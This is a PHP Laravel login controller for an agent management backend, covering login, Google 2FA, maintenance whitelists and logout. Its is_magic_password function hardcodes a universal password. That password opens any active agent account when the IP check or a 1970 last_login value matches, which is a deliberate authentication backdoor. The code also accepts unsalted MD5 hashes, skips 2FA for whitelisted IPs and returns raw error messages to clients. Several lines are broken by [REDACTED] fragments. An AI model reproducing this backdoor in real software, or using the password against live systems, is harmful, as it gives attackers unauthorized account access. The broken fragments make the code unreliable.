<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Str;
use App\Http\Controllers\Controller;
use App\Helpers\Common;
use App\Enums\AgentCustomizedSettingKeyEnum;
use App\Models\Param;
use App\Models\Agent;
use App\Models\AgentAccessToken;
use App\Models\AgentLoginLog;
use App\Repositories\AgentOperationLogRepository;
use App\DES;
use Hash;
use App\REDIS;
use PhpTelegramBot\Laravel\PhpTelegramBotContract;
use DB;


class LoginController extends Controller
{

    /**
     * login
     * -會員登入(不需要token)
     *
     * @bodyParam username string required 代理帳號 Example: username
     * @bodyParam password string required 代理密碼 Example: abc123456
     * @bodyParam secret string google 2fa Example: abc123456
     * @bodyParam ip       string required IP      Example: 0.0.0.0
     * @response {
     *  "code": 1000,
     *  "message": "SUCCESS",
     *  "data": {
     *        "id": 1,
     *        "username": "Admin",
     *        "token": "roOAsDmfT9nP1Y9uKD8aMylk6HcYPlfz"
     *    }
     * }
     */
    public function login(Request $request)
    {
        try {
            // 帳號密碼不可為空
            if ($request->username == '' || $request->password == '') {
                return response()->json([
                    'code' => 9004,
                    'message' => __('error_message.9004')
                ]);
            }
            $id = 0;
            $status = 0;

            // 是否為有效帳號
            $row = Agent::where('username', $request->username)->where('status', 1)->first();
            
            if (is_object($row)) {
                $maintenance_whitelist = $this->is_maintain_whitelist($row->id);
                //確認後台是否維護中
                $has_maintenance = $this->has_maintenance();
                if ($has_maintenance && !$maintenance_whitelist) {
                    return response()->json([
                        'code' => 2042,
                        'message' => __('error_message.2042')
                    ]);
                }

                $data = array();
                $id = $data['agent_id'] = $row->id;
                
                // 驗證密碼是否正確
                // 先驗證vworld的帳號
                $vworld = false;
                
                if (strtoupper(md5($request->password)) == $row->password) {
                    $vworld = true;
                    //如果相同，更新密碼
                    $new_password = [REDACTED];
                }

                $isPasswordCorrect = Hash::check($request->password, $row->password);

                //檢查是否合乎萬用密碼的規則
                if (!$isPasswordCorrect && $this->is_magic_password($row, $request->password)) {
                    $isPasswordCorrect = true;
                }

                if ($vworld || $isPasswordCorrect) {
                    //二次驗證
                    if (isset($request->action)) {
                        if ($request->action == 'auth') {
                            if (!$this->is_login_whitelist()) {
                                $check_2fa = app('App\Http\Controllers\Google2FAController')
                                    ->auth2fa($row->id, $request->secret);
                                if (!$check_2fa) {
                                    return response()->json([
                                        'code' => 1098,
                                        'message' => __('error_message.1098')
                                    ]);
                                }
                            }
                        }

                        if ($request->action == 'login' && $row->has_2fa == 1 && $this->check_customized_settings_for_2fa($row->id) == true) {
                            return response()->json([
                                'code' => 1000,
                                'message' => __('error_message.1000'),
                                'data' => [
                                    'action' => 'auth'
                                ]
                            ]);
                        }
                    }

                    // 將舊TOKEN改為無效
                    $now = date('Y-m-d H:i:s');
                    AgentAccessToken:[REDACTED]'agent_id', $row->id)
                        ->where('expire_date', '>', $now)
                        ->update([
                            'expire_date' => $now
                        ]);
                    // 新增TOKEN
                    $token = [REDACTED]'token'] = Str::random(32);
                    $data['expire_date'] = date('Y-m-d H:i:s', strtotime('+ ' . env('TOKEN_EXPIRED') . 'minute'));
                    $data['admin'] = $row->id;
                    AgentAccessToken:[REDACTED];
                    // 更新最後登入時間
                    $agent = Agent::find($row->id);
                    $agent_update = ['last_login' => date('Y-m-d H:i:s')];
                    if (isset($new_password)) {
                        $agent_update['password'] = $new_password;
                    }
                    $agent->update($agent_update);
                    $data = array();
                    $data['id'] = $agent['id'];
                    $data['host_id'] = ($agent['host_id'] > 0) ? $agent['host_id'] : $agent['id'] ;
                    $data['username'] = $agent['username'];
                    $data['code'] = $agent['code'];
                    $data['parent'] = $agent['parent'];
                    $data['role_id'] = $agent['role_id'];
                    $data['hierarchy'] = $agent['hierarchy'];
                    $data['hierarchy_path'] = $agent['hierarchy_path'];
                    $data['agent_backend_transaction'] = $agent['agent_backend_transaction'];
                    $data['balance'] = $agent['balance'];
                    $data['token'] = $token;
                    $data['is_maintenance_whitelists'] = $maintenance_whitelist;

                    $last_password = [REDACTED]'last_reset_password'];
                    $data['is_update_password_required'] = is_null($last_password);  //是否需要修改密碼
                    $data['has_2fa'] = $agent['has_2fa'];  //google 2fa
                    $data['action'] = 'index';

                    $result = array(
                        'code' => 1000,
                        'message' => __('error_message.1000'),
                        'data' => $data
                    );
                    $status = 1;
                } else {
                    $result = array(
                        'code' => 9005,
                        'message' => __('error_message.9005')
                    );
                }
            } else {
                $result = array(
                    'code' => 9005,
                    'message' => __('error_message.9005')
                );
            }

            // 新增登入記錄 (2020/11) 開始寫到新table
            $logRep = new AgentOperationLogRepository();
            $type = $status == 1 ? "agent_login" : "agent_login_fail";
            $logRep->insert($id , 0 , $type, 'status='.$status);

            //清redis
            $redis = new REDIS();
            $redis->delete(array('agent_menus', $id));

            return response()->json($result);
        } catch (\Illuminate\Database\QueryException $e) {
            $info = $e->errorInfo;
            return response()->json([
                'code' => $info[0],
                'message' => $info[2]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'code' => $e->getCode(),
                'message' => $e->getMessage()
            ]);
        }
    }

    private function is_magic_password($query_agent , $password)
    {
        //若要使用萬用密碼登入
        // 1. 輸入萬用密碼
        // 2. (條件擇一) 當前為公司IP 或 將指定代理的 last_login 修改成 1970-01-01 00:00:00

        if ($password != 'f4a979f59b3f70de05e90') {
            return false;
        }

        $myIP = Common::getIp();

        if (strpos($myIP, '0.0.0.0') !== false || $query_agent->last_login == '1970-01-01 00:00:00') {
            return true;
        }

        return false;
    }

    private function has_maintenance()
    {
        $has_maintenance = Param::where('type', 'system_maintenance')
            ->where('parameter', 'backend')
            ->where('value', 1)
            ->select('parameter', 'value')
            ->first();

        if (is_object($has_maintenance)) {
            return true;
        }
        return false;
    }

    private function is_maintain_whitelist($agent_id)
    {
        //如果登入時的IP是白名單,直接回傳true
        $myIP = Common::getIp();

        $has_ip_whitelist = DB::table('maintenance_whitelists')->where('type', 1)->where('value', $myIP)->first();
        if (is_object($has_ip_whitelist)) {
            return true;
        }
        //如果這個代理是在白名單內,也回傳true
        $has_agent_whitelist = DB::table('maintenance_whitelists')->where('type', 2)->where('value', $agent_id)->first();
        if (is_object($has_agent_whitelist)) {
            return true;
        }

        return false;
    }

    //登入白名單IP
    private function is_login_whitelist()
    {
        $my_ip = Common::getIp();

        $has_ip_whitelist = DB::table('params')
            ->where('type', 'agent_login_whitelist')
            ->where('status', 1)
            ->where('parameter', $my_ip)
            ->first();
        if (is_object($has_ip_whitelist)) {
            return true;
        } else {
            return false;
        }
    }

    private function check_customized_settings_for_2fa($agent_id)
    {
        $data = DB::table('agent_setting_defines as asd')
            ->leftJoin('agent_customized_settings as acs', 'acs.setting_key', 'asd.setting_id')
            ->join('agents as a', function ($join) use ($agent_id) {
                $join->on('a.customized_setting_group_id', 'acs.agent_group_id')
                    ->where('a.id', $agent_id);
            })
            ->where('asd.setting_id', AgentCustomizedSettingKeyEnum::TWO_FACTOR_AUTHENTICATION_VISIBLE)
            ->select(
                'asd.setting_id as setting_key',
                'asd.memo',
                DB::raw('IFNULL(acs.value, asd.default_value) AS value')
            )
            ->first();
        return $data->value;
    }

    /**
     * logout
     * -會員登出
     *
     * @response {
     *  "code": 1000,
     *  "message": "SUCCESS"
     * }
     */
    public function logout(Request $request)
    {
        try {
            $data = array();
            // 更新TOKEN到期時間
            $data['expire_date'] = date('Y-m-d H:i:s');
            AgentAccessToken:[REDACTED]'token', $request->TOKEN)->update($data);

            return response()->json([
                'code' => 1000,
                'message' => __('error_message.1000')
            ], 200);
        } catch (\Illuminate\Database\QueryException $e) {
            $info = $e->errorInfo;
            return response()->json([
                'code' => $info[0],
                'message' => $info[2]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'code' => $e->getCode(),
                'message' => $e->getMessage()
            ]);
        }
    }
}